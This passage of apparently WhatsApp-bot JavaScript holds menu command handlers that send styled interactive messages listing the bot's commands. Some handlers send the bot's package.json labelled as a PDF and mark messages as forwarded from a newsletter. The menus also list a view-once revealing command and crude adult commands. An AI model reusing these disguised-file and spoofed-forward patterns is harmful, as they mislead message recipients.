                    `🏮 *${global.namaBot}* 🏮\n👋 _Hello ${m.pushName || "User"}, ${global.ucapan()}!_\nI am a premium, multi-functional WhatsApp Assistant designed by ${global.namaOwner}.\n\n╔═════ ❖ *𝖲𝖸𝖲𝖳𝖤𝖬 𝖨𝖭𝖥𝖮* ❖ ════╗\n  ⛩️ *𝖮𝗐𝗇𝖾𝗋* : ${global.namaOwner}\n  🔌 *𝖵𝖾𝗋𝗌𝗂𝗈𝗇* : ${global.versi}\n  ⚙️ *𝖬𝗈𝖽𝖾* : ${fitur.public ? "𝖯𝗎𝖻𝗅𝗂𝖼" : "𝖲𝖾𝗅𝖿"}\n  🎗️ *𝖲𝗍𝖺𝗍𝗎𝗌* : ${isAn ? "𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋" : isPrem ? "𝖯𝗋𝖾𝗆𝗂𝗎𝗆" : "𝖥𝗋𝖾𝖾 𝖴𝗌𝖾𝗋"}\n  ⏳ *𝖴𝗉𝗍𝗂𝗆𝖾* : ${runtime(process.uptime())}\n  🌌 *𝖢𝗈𝗆𝗆𝖺𝗇𝖽𝗌* : ${getTotalFitur()} Features\n╚════════════════════╝\n\nNavigate through the dashboard below:`;


                let buttons = getPremiumButtons('menu');


                let mediaType = global.menuSetting;
                let mediaObj = {};
                let hasMedia = false;

                try {
                    if (mediaType === 'docu' || mediaType === 'doc') {
                        // Mode Dokumen
                        mediaObj = await prepareWAMessageMedia({
                            document: fsSync.readFileSync("./package.json"), // pastikan file ada
                            fileName: `— ${global.namaOwner}.pdf`,
                            mimetype: "application/pdf"
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;

                    } else if (mediaType === 'gif' || mediaType === 'video') {
                        // Mode GIF 
                        mediaObj = await prepareWAMessageMedia({
                            video: { url: global.mp4Menu },
                            gifPlayback: true
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;

                    } else {
                        // Mode (buttonNew)
                        mediaObj = await prepareWAMessageMedia({
                            image: { url: global.thumb }
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;
                    }
                } catch (err) {
                    console.log("Gagal memuat media menuv2, beralih ke mode teks saja:", err.message);
                }


                let headerObj = { hasMediaAttachment: hasMedia };
                if (hasMedia) {
                    Object.assign(headerObj, mediaObj);
                }


                let msg = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.create({

                                contextInfo: {
                                    isForwarded: true,
                                    forwardedNewsletterMessageInfo: {
                                        newsletterName: global.namaSaluran,
                                        newsletterJid: global.idCh,
                                        serverMessageId: -1
                                    },
                                    externalAdReply: {
                                        title: `${global.namaOwner}`,
                                        body: global.namaBot,
                                        thumbnailUrl: global.thumb,
                                        sourceUrl: global.linkSaluran,
                                        mediaType: 1,
                                        renderLargerThumbnail: true
                                    }
                                },
                                body: proto.Message.InteractiveMessage.Body.create({ text: `${global.namaBot}` }),
                                footer: proto.Message.InteractiveMessage.Footer.create({ text: Sambut }),
                                header: proto.Message.InteractiveMessage.Header.create(headerObj),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                    buttons: buttons
                                })
                            })
                        }
                    }
                }, { quoted: m });

                // Kirim Menu
                await sock.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

                try {
                    if (global.audioMenu) {
                        await sock.sendMessage(m.chat, {
                            audio: { url: global.audioMenu },
                            mimetype: 'audio/mpeg',
                            ptt: true
                        }, { quoted: m });
                    }
                } catch (err) {
                    console.log("Gagal mengirim audio menuv2, abaikan jika link mati (404):", err.message);
                }
            }
                break;

            case 'ownermenu':
            case 'menuowner': {

                await sock.sendMessage(m.chat, { react: { text: "⏰", key: m.key } });
                await sleep(1000);



                const Sambut =
                    `🏮 *${global.namaBot}* 🏮\n👋 _Hello ${m.pushName || "User"}, ${global.ucapan()}!_\nI am a premium, multi-functional WhatsApp Assistant designed by ${global.namaOwner}.\n\n╔═════ ❖ *𝖲𝖸𝖲𝖳𝖤𝖬 𝖨𝖭𝖥𝖮* ❖ ════╗\n  ⛩️ *𝖮𝗐𝗇𝖾𝗋* : ${global.namaOwner}\n  🔌 *𝖵𝖾𝗋𝗌𝗂𝗈𝗇* : ${global.versi}\n  ⚙️ *𝖬𝗈𝖽𝖾* : ${fitur.public ? "𝖯𝗎𝖻𝗅𝗂𝖼" : "𝖲𝖾𝗅𝖿"}\n  🎗️ *𝖲𝗍𝖺𝗍𝗎𝗌* : ${isAn ? "𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋" : isPrem ? "𝖯𝗋𝖾𝗆𝗂𝗎𝗆" : "𝖥𝗋𝖾𝖾 𝖴𝗌𝖾𝗋"}\n  ⏳ *𝖴𝗉𝗍𝗂𝗆𝖾* : ${runtime(process.uptime())}\n  🌌 *𝖢𝗈𝗆𝗆𝖺𝗇𝖽𝗌* : ${getTotalFitur()} Features\n╚════════════════════╝\n\nNavigate through the dashboard below: \`𝐌𝐄𝐍𝐔 𝐎𝐖𝐍𝐄𝐑\`  
┃${prefix}backup 
┃${prefix}restart 
┃${prefix}clearsesion 
┃${prefix}public 
┃${prefix}private 
┃${prefix}mode 
┃${prefix}setprefix
┃${prefix}prefix
┃${prefix}delprefix
┃${prefix}addowner
┃${prefix}listowner 
┃${prefix}delowner
┃${prefix}addprem
┃${prefix}listprem
┃${prefix}delprem
┃${prefix}kick
┃${prefix}delete
┃${prefix}del
┃${prefix}hidetag
┃${prefix}opengc
┃${prefix}closegc
┃${prefix}addsewa
┃${prefix}delsewa
┃${prefix}editsewa
┃${prefix}unblock
┃${prefix}accall
┃${prefix}maintenance
┃${prefix}autobackup
┃${prefix}upset
╰━─━━─━━─━━─━━─━━━━さ`;


                let buttons = getPremiumButtons('ownermenu');


                let mediaType = global.menuSetting;
                let mediaObj = {};
                let hasMedia = false;

                try {
                    if (mediaType === 'docu' || mediaType === 'doc') {
                        // Mode Dokumen
                        mediaObj = await prepareWAMessageMedia({
                            document: fsSync.readFileSync("./package.json"), // pastikan file ada
                            fileName: `— ${global.namaOwner}.pdf`,
                            mimetype: "application/pdf"
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;

                    } else if (mediaType === 'gif' || mediaType === 'video') {
                        // Mode GIF 
                        mediaObj = await prepareWAMessageMedia({
                            video: { url: global.mp4Menu },
                            gifPlayback: true
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;

                    } else {
                        // Mode(buttonNew)
                        mediaObj = await prepareWAMessageMedia({
                            image: { url: global.thumb }
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;
                    }
                } catch (err) {
                    console.log("Gagal memuat media menuv2, beralih ke mode teks saja:", err.message);
                }


                let headerObj = { hasMediaAttachment: hasMedia };
                if (hasMedia) {
                    Object.assign(headerObj, mediaObj);
                }


                let msg = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.create({

                                contextInfo: {
                                    isForwarded: true,
                                    forwardedNewsletterMessageInfo: {
                                        newsletterName: global.namaSaluran,
                                        newsletterJid: global.idCh,
                                        serverMessageId: -1
                                    },
                                    externalAdReply: {
                                        title: `${global.namaOwner}`,
                                        body: global.namaBot,
                                        thumbnailUrl: global.thumb,
                                        sourceUrl: global.linkSaluran,
                                        mediaType: 1,
                                        renderLargerThumbnail: true
                                    }
                                },
                                body: proto.Message.InteractiveMessage.Body.create({ text: `${global.namaBot}` }),
                                footer: proto.Message.InteractiveMessage.Footer.create({ text: Sambut }),
                                header: proto.Message.InteractiveMessage.Header.create(headerObj),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                    buttons: buttons
                                })
                            })
                        }
                    }
                }, { quoted: m });

                // Kirim Menu
                await sock.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

                try {
                    if (global.audioMenu) {
                        await sock.sendMessage(m.chat, {
                            audio: { url: global.audioMenu },
                            mimetype: 'audio/mp4',
                            ptt: true
                        }, { quoted: m });
                    }
                } catch (err) {
                    console.log("Gagal mengirim audio menuv2, abaikan jika link mati (404):", err.message);
                }
            }
                break;

            case 'allmenu':
            case 'menuall': {

                await sock.sendMessage(m.chat, { react: { text: "⏰", key: m.key } });
                await sleep(1000);



                const Sambut =
                    `🏮 *${global.namaBot}* 🏮\n👋 _Hello ${m.pushName || "User"}, ${global.ucapan()}!_\nI am a premium, multi-functional WhatsApp Assistant designed by ${global.namaOwner}.\n\n╔═════ ❖ *𝖲𝖸𝖲𝖳𝖤𝖬 𝖨𝖭𝖥𝖮* ❖ ════╗\n  ⛩️ *𝖮𝗐𝗇𝖾𝗋* : ${global.namaOwner}\n  🔌 *𝖵𝖾𝗋𝗌𝗂𝗈𝗇* : ${global.versi}\n  ⚙️ *𝖬𝗈𝖽𝖾* : ${fitur.public ? "𝖯𝗎𝖻𝗅𝗂𝖼" : "𝖲𝖾𝗅𝖿"}\n  🎗️ *𝖲𝗍𝖺𝗍𝗎𝗌* : ${isAn ? "𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋" : isPrem ? "𝖯𝗋𝖾𝗆𝗂𝗎𝗆" : "𝖥𝗋𝖾𝖾 𝖴𝗌𝖾𝗋"}\n  ⏳ *𝖴𝗉𝗍𝗂𝗆𝖾* : ${runtime(process.uptime())}\n  🌌 *𝖢𝗈𝗆𝗆𝖺𝗇𝖽𝗌* : ${getTotalFitur()} Features\n╚════════════════════╝\n\nNavigate through the dashboard below: \`𝐌𝐄𝐍𝐔 𝐅𝐈𝐋𝐄\`  
┃${prefix}addcase
┃${prefix}listcase 
┃${prefix}getcase 
┃${prefix}delcase
╰━─━━─━━─━━─━━─━━━━✦さ
╭──〔 *👥 𝐌𝐄𝐍𝐔 𝐆𝐑𝐎𝐔𝐏* 〕──╮
│
│ ≽ ${prefix}mulaiabsen
│ ≽ ${prefix}absen
│ ≽ ${prefix}listabsen
│ ≽ ${prefix}delabsen
│ ≽ ${prefix}intro
│ ≽ ${prefix}opentime
│ ≽ ${prefix}closetime
│ ≽ ${prefix}onsholat
│ ≽ ${prefix}offsholat
│ ≽ ${prefix}autosholat
│ ≽ ${prefix}cekidgc
│ ≽ ${prefix}idgc
│ ≽ ${prefix}buy1gb - buyunli
│ ≽ ${prefix}ceksewa
│ ≽ ${prefix}runtime
│ ≽ ${prefix}bot
│ ≽ ${prefix}imsakiyah
│ ≽ ${prefix}totalpesan
│ ≽ ${prefix}totalchat
│ ≽ ${prefix}resetchat
│ ≽ ${prefix}daftar
│ ≽ ${prefix}ceksn
│ ≽ ${prefix}unreg
│ ≽ ${prefix}tagall
│ ≽ ${prefix}addlist
│ ≽ ${prefix}dellist
│ ≽ ${prefix}updatelist
│ ≽ ${prefix}list
│ ≽ ${prefix}afk
│
╰─────────────────────╯
╭──〔 *👑 𝐌𝐄𝐍𝐔 𝐎𝐖𝐍𝐄𝐑* 〕──╮
│
│ ≽ ${prefix}backup
│ ≽ ${prefix}restart
│ ≽ ${prefix}clearsesion
│ ≽ ${prefix}public
│ ≽ ${prefix}private
│ ≽ ${prefix}mode
│ ≽ ${prefix}setprefix
│ ≽ ${prefix}prefix
│ ≽ ${prefix}delprefix
│ ≽ ${prefix}addowner
│ ≽ ${prefix}listowner
│ ≽ ${prefix}delowner
│ ≽ ${prefix}addprem
│ ≽ ${prefix}listprem
│ ≽ ${prefix}delprem
│ ≽ ${prefix}kick
│ ≽ ${prefix}delete
│ ≽ ${prefix}del
│ ≽ ${prefix}hidetag
│ ≽ ${prefix}opengc
│ ≽ ${prefix}closegc
│ ≽ ${prefix}addsewa
│ ≽ ${prefix}delsewa
│ ≽ ${prefix}editsewa
│ ≽ ${prefix}unblock
│ ≽ ${prefix}accall
│ ≽ ${prefix}maintenance
│ ≽ ${prefix}autobackup
│ ≽ ${prefix}upset
│
╰─────────────────────╯
╭──〔 *✨ 𝐌𝐄𝐍𝐔 𝐎𝐓𝐇𝐄𝐑* 〕──╮
│
│ ≽ ${prefix}sticker
│ ≽ ${prefix}tourl
│ ≽ ${prefix}brat
│ ≽ ${prefix}bratvid
│ ≽ ${prefix}ping
│ ≽ ${prefix}owner
│ ≽ ${prefix}totalfitur
│ ≽ ${prefix}cekidch
│ ≽ ${prefix}playch
│ ≽ ${prefix}iqc
│ ≽ ${prefix}tm
│ ≽ ${prefix}bola
│ ≽ ${prefix}linkgc
│ ≽ ${prefix}infogc
│ ≽ ${prefix}turnamenml
│ ≽ ${prefix}cetakstruk
│ ≽ ${prefix}kodepos
│
╰─────────────────────╯
╭──〔 *🛠️ 𝐌𝐄𝐍𝐔 𝐓𝐎𝐎𝐋𝐒* 〕──╮
│
│ ≽ ${prefix}toimage
│ ≽ ${prefix}tovn
│ ≽ ${prefix}getpp
│ ≽ ${prefix}smeme
│ ≽ ${prefix}swgc
│ ≽ ${prefix}hd
│ ≽ ${prefix}hd2
│ ≽ ${prefix}remini
│ ≽ ${prefix}hdvid
│ ≽ ${prefix}pplx (ai)
│ ≽ ${prefix}aichat (ai)
│ ≽ ${prefix}get
│ ≽ ${prefix}get2
│ ≽ ${prefix}groq
│ ≽ ${prefix}ai
│ ≽ ${prefix}rvo
│ ≽ ${prefix}toanime
│ ≽ ${prefix}upch
│ ≽ ${prefix}toch
│ ≽ ${prefix}getsw
│ ≽ ${prefix}toaudio
│ ≽ ${prefix}autoai
│ ≽ ${prefix}ssweb
│ ≽ ${prefix}cekresi
│ ≽ ${prefix}getresi
│
╰─────────────────────╯
╭──〔 *📥 𝐌𝐄𝐍𝐔 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃* 〕──╮
│
│ ≽ ${prefix}play
│ ≽ ${prefix}tt
│ ≽ ${prefix}ttsearch
│ ≽ ${prefix}fb
│ ≽ ${prefix}ig
│ ≽ ${prefix}spotify
│ ≽ ${prefix}capcut
│ ≽ ${prefix}ytmp3
│ ≽ ${prefix}pin
│ ≽ ${prefix}pinterest
│ ≽ ${prefix}mediafire
│ ≽ ${prefix}twitter
│ ≽ ${prefix}donghua
│ ≽ ${prefix}sfile
│ ≽ ${prefix}soundcloud
│ ≽ ${prefix}scdl
│
╰─────────────────────╯
╭──〔 *🎲 𝐌𝐄𝐍𝐔 𝐑𝐀𝐍𝐃𝐎𝐌* 〕──╮
│
│ ≽ ${prefix}cekkaya
│ ≽ ${prefix}cekfemboy
│ ≽ ${prefix}cekkontol
│ ≽ ${prefix}cekmemek
│ ≽ ${prefix}cekcantil
│ ≽ ${prefix}ceklesby
│ ≽ ${prefix}tekateki
│ ≽ ${prefix}jawabteka
│ ≽ ${prefix}hentai
│
╰─────────────────────╯
╭──〔 *✨ 𝐌𝐄𝐍𝐔* 〕──╮
│
│ ≽ ${prefix}1gb - 10gb
│ ≽ ${prefix}unli
│ ≽ ${prefix}listpanel
│ ≽ ${prefix}delpanel
│ ≽ ${prefix}cadmin
│ ≽ ${prefix}listadmin
│ ≽ ${prefix}deladmin
│ ≽ ${prefix}clearpanel
│ ≽ ${prefix}addsrv
│ ≽ ${prefix}addresseler
│ ≽ ${prefix}listresseler
│ ≽ ${prefix}delresseler
│
╰─────────────────────╯
╭──〔 *✨ 𝐌𝐄𝐍𝐔* 〕──╮
│
│ ≽ ${prefix}1gbv2 - 10gbv2
│ ≽ ${prefix}unliv2
│ ≽ ${prefix}listpanelv2
│ ≽ ${prefix}delpanelv2
│ ≽ ${prefix}cadminv2
│ ≽ ${prefix}listadminv2
│ ≽ ${prefix}deladminv2
│ ≽ ${prefix}clearpanelv2
│ ≽ ${prefix}addsrvv2
│ ≽ ${prefix}addgrupseller
│ ≽ ${prefix}listgrupreseller
│ ≽ ${prefix}delgrupseler
│
╰─────────────────────╯
`;


                let buttons = getPremiumButtons('allmenu');


                let mediaType = global.menuSetting;
                let mediaObj = {};
                let hasMedia = false;

                try {
                    if (mediaType === 'docu' || mediaType === 'doc') {
                        // Mode Dokumen
                        mediaObj = await prepareWAMessageMedia({
                            document: fsSync.readFileSync("./package.json"), // pastikan file ada
                            fileName: `— ${global.namaOwner}.pdf`,
                            mimetype: "application/pdf"
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;

                    } else if (mediaType === 'gif' || mediaType === 'video') {
                        // Mode GIF / Video
                        mediaObj = await prepareWAMessageMedia({
                            video: { url: global.mp4Menu },
                            gifPlayback: true
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;

                    } else {
                        // Mode Default (buttonNew)
                        mediaObj = await prepareWAMessageMedia({
                            image: { url: global.thumb }
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;
                    }
                } catch (err) {
                    console.log("Gagal memuat media menuv2, beralih ke mode teks saja:", err.message);
                }


                let headerObj = { hasMediaAttachment: hasMedia };
                if (hasMedia) {
                    Object.assign(headerObj, mediaObj);
                }


                let msg = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.create({

                                contextInfo: {
                                    isForwarded: true,
                                    forwardedNewsletterMessageInfo: {
                                        newsletterName: global.namaSaluran,
                                        newsletterJid: global.idCh,
                                        serverMessageId: -1
                                    },
                                    externalAdReply: {
                                        title: `${global.namaOwner}`,
                                        body: global.namaBot,
                                        thumbnailUrl: global.thumb,
                                        sourceUrl: global.linkSaluran,
                                        mediaType: 1,
                                        renderLargerThumbnail: true
                                    }
                                },
                                body: proto.Message.InteractiveMessage.Body.create({ text: `${global.namaBot}` }),
                                footer: proto.Message.InteractiveMessage.Footer.create({ text: Sambut }),
                                header: proto.Message.InteractiveMessage.Header.create(headerObj),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                    buttons: buttons
                                })
                            })
                        }
                    }
                }, { quoted: m });

                // Kirim Menu
                await sock.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

                try {
                    if (global.audioMenu) {
                        await sock.sendMessage(m.chat, {
                            audio: { url: global.audioMenu },
                            mimetype: 'audio/mp4',
                            ptt: true
                        }, { quoted: m });
                    }
                } catch (err) {
                    console.log("Gagal mengirim audio menuv2, abaikan jika link mati (404):", err.message);
                }
            }
                break;

            case 'filemenu':
            case 'menufile': {

                await sock.sendMessage(m.chat, { react: { text: "⏰", key: m.key } });
                await sleep(1000);



                const Sambut =
                    `🏮 *${global.namaBot}* 🏮\n👋 _Hello ${m.pushName || "User"}, ${global.ucapan()}!_\nI am a premium, multi-functional WhatsApp Assistant designed by ${global.namaOwner}.\n\n╔═════ ❖ *𝖲𝖸𝖲𝖳𝖤𝖬 𝖨𝖭𝖥𝖮* ❖ ════╗\n  ⛩️ *𝖮𝗐𝗇𝖾𝗋* : ${global.namaOwner}\n  🔌 *𝖵𝖾𝗋𝗌𝗂𝗈𝗇* : ${global.versi}\n  ⚙️ *𝖬𝗈𝖽𝖾* : ${fitur.public ? "𝖯𝗎𝖻𝗅𝗂𝖼" : "𝖲𝖾𝗅𝖿"}\n  🎗️ *𝖲𝗍𝖺𝗍𝗎𝗌* : ${isAn ? "𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋" : isPrem ? "𝖯𝗋𝖾𝗆𝗂𝗎𝗆" : "𝖥𝗋𝖾𝖾 𝖴𝗌𝖾𝗋"}\n  ⏳ *𝖴𝗉𝗍𝗂𝗆𝖾* : ${runtime(process.uptime())}\n  🌌 *𝖢𝗈𝗆𝗆𝖺𝗇𝖽𝗌* : ${getTotalFitur()} Features\n╚════════════════════╝\n\nNavigate through the dashboard below: \`𝐌𝐄𝐍𝐔 𝐅𝐈𝐋𝐄\`  
┃${prefix}addcase
┃${prefix}listcase
┃${prefix}getcase
┃${prefix}delcase
╰━─━━─━━─━━─━━─━━━━さ
`;


                let buttons = getPremiumButtons('filemenu');


                let mediaType = global.menuSetting;
                let mediaObj = {};
                let hasMedia = false;

                try {
                    if (mediaType === 'docu' || mediaType === 'doc') {
                        // Mode Dokumen
                        mediaObj = await prepareWAMessageMedia({
                            document: fsSync.readFileSync("./package.json"), // pastikan file ada
                            fileName: `— ${global.namaOwner}.pdf`,
                            mimetype: "application/pdf"
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;

                    } else if (mediaType === 'gif' || mediaType === 'video') {
                        // Mode GIF 
                        mediaObj = await prepareWAMessageMedia({
                            video: { url: global.mp4Menu },
                            gifPlayback: true
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;

                    } else {
                        // Mode (buttonNew)
                        mediaObj = await prepareWAMessageMedia({
                            image: { url: global.thumb }
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;
                    }
                } catch (err) {
                    console.log("Gagal memuat media menuv2, beralih ke mode teks saja:", err.message);
                }


                let headerObj = { hasMediaAttachment: hasMedia };
                if (hasMedia) {
                    Object.assign(headerObj, mediaObj);
                }


                let msg = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.create({

                                contextInfo: {
                                    isForwarded: true,
                                    forwardedNewsletterMessageInfo: {
                                        newsletterName: global.namaSaluran,
                                        newsletterJid: global.idCh,
                                        serverMessageId: -1
                                    },
                                    externalAdReply: {
                                        title: `${global.namaOwner}`,
                                        body: global.namaBot,
                                        thumbnailUrl: global.thumb,
                                        sourceUrl: global.linkSaluran,
                                        mediaType: 1,
                                        renderLargerThumbnail: true
                                    }
                                },
                                body: proto.Message.InteractiveMessage.Body.create({ text: `${global.namaBot}` }),
                                footer: proto.Message.InteractiveMessage.Footer.create({ text: Sambut }),
                                header: proto.Message.InteractiveMessage.Header.create(headerObj),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                    buttons: buttons
                                })
                            })
                        }
                    }
                }, { quoted: m });

                // Kirim Menu
                await sock.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

                try {
                    if (global.audioMenu) {
                        await sock.sendMessage(m.chat, {
                            audio: { url: global.audioMenu },
                            mimetype: 'audio/mp4',
                            ptt: true
                        }, { quoted: m });
                    }
                } catch (err) {
                    console.log("Gagal mengirim audio menuv2, abaikan jika link mati (404):", err.message);
                }
            }
                break;

            case 'othermenu':
            case 'menuother': {

                await sock.sendMessage(m.chat, { react: { text: "⏰", key: m.key } });
                await sleep(1000);



                const Sambut =
                    `🏮 *${global.namaBot}* 🏮\n👋 _Hello ${m.pushName || "User"}, ${global.ucapan()}!_\nI am a premium, multi-functional WhatsApp Assistant designed by ${global.namaOwner}.\n\n╔═════ ❖ *𝖲𝖸𝖲𝖳𝖤𝖬 𝖨𝖭𝖥𝖮* ❖ ════╗\n  ⛩️ *𝖮𝗐𝗇𝖾𝗋* : ${global.namaOwner}\n  🔌 *𝖵𝖾𝗋𝗌𝗂𝗈𝗇* : ${global.versi}\n  ⚙️ *𝖬𝗈𝖽𝖾* : ${fitur.public ? "𝖯𝗎𝖻𝗅𝗂𝖼" : "𝖲𝖾𝗅𝖿"}\n  🎗️ *𝖲𝗍𝖺𝗍𝗎𝗌* : ${isAn ? "𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋" : isPrem ? "𝖯𝗋𝖾𝗆𝗂𝗎𝗆" : "𝖥𝗋𝖾𝖾 𝖴𝗌𝖾𝗋"}\n  ⏳ *𝖴𝗉𝗍𝗂𝗆𝖾* : ${runtime(process.uptime())}\n  🌌 *𝖢𝗈𝗆𝗆𝖺𝗇𝖽𝗌* : ${getTotalFitur()} Features\n╚════════════════════╝\n\nNavigate through the dashboard below: \`𝐌𝐄𝐍𝐔 𝐎𝐓𝐇𝐄𝐑\`  
┃${prefix}sticker 
┃${prefix}tourl
┃${prefix}brat
┃${prefix}bratvid
┃${prefix}ping 
┃${prefix}owner
┃${prefix}totalfitur 
┃${prefix}cekidch
┃${prefix}playch
┃${prefix}iqc
┃${prefix}tm
┃${prefix}bola
┃${prefix}linkgc
┃${prefix}infogc
┃${prefix}turnamenml
┃${prefix}cetakstruk
┃${prefix}kodepos
╰━─━━─━━─━━─━━─━━━━さ
`;


                let buttons = getPremiumButtons('othermenu');


                let mediaType = global.menuSetting;
                let mediaObj = {};
                let hasMedia = false;

                try {
                    if (mediaType === 'docu' || mediaType === 'doc') {
                        // Mode Dokumen
                        mediaObj = await prepareWAMessageMedia({
                            document: fsSync.readFileSync("./package.json"), // pastikan file ada
                            fileName: `— ${global.namaOwner}.pdf`,
                            mimetype: "application/pdf"
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;

                    } else if (mediaType === 'gif' || mediaType === 'video') {
                        // Mode GIF 
                        mediaObj = await prepareWAMessageMedia({
                            video: { url: global.mp4Menu },
                            gifPlayback: true
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;

                    } else {
                        // Mode (buttonNew)
                        mediaObj = await prepareWAMessageMedia({
                            image: { url: global.thumb }
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;
                    }
                } catch (err) {
                    console.log("Gagal memuat media menuv2, beralih ke mode teks saja:", err.message);
                }


                let headerObj = { hasMediaAttachment: hasMedia };
                if (hasMedia) {
                    Object.assign(headerObj, mediaObj);
                }


                let msg = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.create({

                                contextInfo: {
                                    isForwarded: true,
                                    forwardedNewsletterMessageInfo: {
                                        newsletterName: global.namaSaluran,
                                        newsletterJid: global.idCh,
                                        serverMessageId: -1
                                    },
                                    externalAdReply: {
                                        title: `${global.namaOwner}`,
                                        body: global.namaBot,
                                        thumbnailUrl: global.thumb,
                                        sourceUrl: global.linkSaluran,
                                        mediaType: 1,
                                        renderLargerThumbnail: true
                                    }
                                },
                                body: proto.Message.InteractiveMessage.Body.create({ text: `${global.namaBot}` }),
                                footer: proto.Message.InteractiveMessage.Footer.create({ text: Sambut }),
                                header: proto.Message.InteractiveMessage.Header.create(headerObj),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                    buttons: buttons
                                })
                            })
                        }
                    }
                }, { quoted: m });

                // Kirim Menu
                await sock.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

                try {
                    if (global.audioMenu) {
                        await sock.sendMessage(m.chat, {
                            audio: { url: global.audioMenu },
                            mimetype: 'audio/mp4',
                            ptt: true
                        }, { quoted: m });
                    }
                } catch (err) {
                    console.log("Gagal mengirim audio menuv2, abaikan jika link mati (404):", err.message);
                }
            }
                break;

            case 'toolsmenu':
            case 'menutools': {

                await sock.sendMessage(m.chat, { react: { text: "⏰", key: m.key } });
                await sleep(1000);



                const Sambut =
                    `🏮 *${global.namaBot}* 🏮\n👋 _Hello ${m.pushName || "User"}, ${global.ucapan()}!_\nI am a premium, multi-functional WhatsApp Assistant designed by ${global.namaOwner}.\n\n╔═════ ❖ *𝖲𝖸𝖲𝖳𝖤𝖬 𝖨𝖭𝖥𝖮* ❖ ════╗\n  ⛩️ *𝖮𝗐𝗇𝖾𝗋* : ${global.namaOwner}\n  🔌 *𝖵𝖾𝗋𝗌𝗂𝗈𝗇* : ${global.versi}\n  ⚙️ *𝖬𝗈𝖽𝖾* : ${fitur.public ? "𝖯𝗎𝖻𝗅𝗂𝖼" : "𝖲𝖾𝗅𝖿"}\n  🎗️ *𝖲𝗍𝖺𝗍𝗎𝗌* : ${isAn ? "𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋" : isPrem ? "𝖯𝗋𝖾𝗆𝗂𝗎𝗆" : "𝖥𝗋𝖾𝖾 𝖴𝗌𝖾𝗋"}\n  ⏳ *𝖴𝗉𝗍𝗂𝗆𝖾* : ${runtime(process.uptime())}\n  🌌 *𝖢𝗈𝗆𝗆𝖺𝗇𝖽𝗌* : ${getTotalFitur()} Features\n╚════════════════════╝\n\nNavigate through the dashboard below: \`𝐌𝐄𝐍𝐔 𝐓𝐎𝐎𝐋𝐒\`  
┃${prefix}toimage 
┃${prefix}tovn
┃${prefix}getpp
┃${prefix}smeme
┃${prefix}swgc
┃${prefix}hd
┃${prefix}hd2
┃${prefix}remini
┃${prefix}hdvid
┃${prefix}pplx (ai) 
┃${prefix}aichat (ai) 
┃${prefix}get
┃${prefix}get2
┃${prefix}groq
┃${prefix}ai
┃${prefix}rvo
┃${prefix}toanime
┃${prefix}upch
┃${prefix}toch
┃${prefix}getsw
┃${prefix}toaudio
┃${prefix}autoai
┃${prefix}ssweb
┃${prefix}cekresi
┃${prefix}getresi
╰━─━━─━━─━━─━━─━━━━さ
`;


                let buttons = getPremiumButtons('toolsmenu');


                let mediaType = global.menuSetting;
                let mediaObj = {};
                let hasMedia = false;

                try {
                    if (mediaType === 'docu' || mediaType === 'doc') {
                        // Mode Dokumen
                        mediaObj = await prepareWAMessageMedia({
                            document: fsSync.readFileSync("./package.json"), // pastikan file ada
                            fileName: `— ${global.namaOwner}.pdf`,
                            mimetype: "application/pdf"
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;

                    } else if (mediaType === 'gif' || mediaType === 'video') {
                        // Mode GIF 
                        mediaObj = await prepareWAMessageMedia({
                            video: { url: global.mp4Menu },
                            gifPlayback: true
                        }, { upload: sock.waUploadToServer });
                        hasMedia = true;

                    } else {
                        // Mode (buttonNew)
                        mediaObj = await prepareWAMessageMedia({
                            image: { url: global.thumb }
